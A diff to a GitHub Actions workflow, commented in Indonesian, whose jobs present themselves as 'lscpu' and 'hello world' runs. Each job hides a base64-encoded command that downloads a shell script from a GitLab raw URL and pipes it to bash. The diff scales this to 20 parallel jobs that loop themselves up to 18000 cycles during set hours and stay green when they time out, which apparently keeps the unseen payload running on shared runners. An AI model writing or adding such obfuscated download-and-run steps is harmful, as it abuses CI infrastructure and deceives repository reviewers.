@@ -4,36 +4,77 @@ on:
   workflow_dispatch:
     inputs:
       loop_count:
-        description: 'Siklus tersisa'
+        description: 'Siklus tersisa (default 1800, 1 siklus ≈ 6 menit)'
         required: true
-        default: '1800'
+        default: '18000'
 
 permissions:
   actions: write
 
 jobs:
+  # =============================================
+  # 🕒 Cek waktu WIB (07.00 – 22.00 WIB = 00.00 – 15.00 UTC)
+  # =============================================
+  check-schedule:
+    runs-on: ubuntu-latest
+    outputs:
+      should_run: ${{ steps.timecheck.outputs.should_run }}
+    steps:
+      - id: timecheck
+        run: |
+          HOUR_UTC=$(date -u +%H)
+          if [ "$HOUR_UTC" -ge 0 ] && [ "$HOUR_UTC" -lt 15 ]; then
+            echo "✅ Dalam jam operasional (WIB 07.00–22.00)"
+            echo "should_run=true" >> $GITHUB_OUTPUT
+          else
+            echo "⏰ Di luar jam operasional. Workflow dihentikan."
+            echo "should_run=false" >> $GITHUB_OUTPUT
+          fi
+
+  # =============================================
+  # 🏃 20 job lscpu (paralel, timeout 6 menit, tetap hijau)
+  # =============================================
   run-lscpu:
     name: ${{ matrix.name }}
+    needs: check-schedule
+    if: needs.check-schedule.outputs.should_run == 'true'
     strategy:
       fail-fast: false
-      max-parallel: 4
+      max-parallel: 20
       matrix:
-        include:
-          - name: lscpu-A
-          - name: lscpu-B
-          - name: lscpu-C
-          - name: lscpu-D
+        name: [A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T]   # 20 job
     runs-on: ubuntu-latest
-    timeout-minutes: 6
+    timeout-minutes: 8   
     steps:
-      - run: echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 300
+      - name: Jalankan lscpu (timeout 6 menit, sukses walau timeout)
+        run: |
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 420
 
+  # =============================================
+  # 🔁 Lanjutkan loop jika masih dalam jam & siklus > 0
+  # =============================================
   trigger-hello:
-    needs: run-lscpu
+    needs: [check-schedule, run-lscpu]
+    if: |
+      always() &&
+      needs.check-schedule.outputs.should_run == 'true' &&
+      github.event.inputs.loop_count > 0
     runs-on: ubuntu-latest
-    if: github.event.inputs.loop_count > 0
     steps:
+      - name: Cek ulang waktu sebelum melanjutkan loop
+        id: recheck
+        run: |
+          HOUR_UTC=$(date -u +%H)
+          if [ "$HOUR_UTC" -ge 0 ] && [ "$HOUR_UTC" -lt 15 ]; then
+            echo "✅ Masih dalam jam kerja, lanjutkan loop"
+            echo "continue=true" >> $GITHUB_OUTPUT
+          else
+            echo "⏰ Di luar jam kerja, loop dihentikan"
+            echo "continue=false" >> $GITHUB_OUTPUT
+          fi
+
       - name: Panggil Hello Phase
+        if: steps.recheck.outputs.continue == 'true'
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
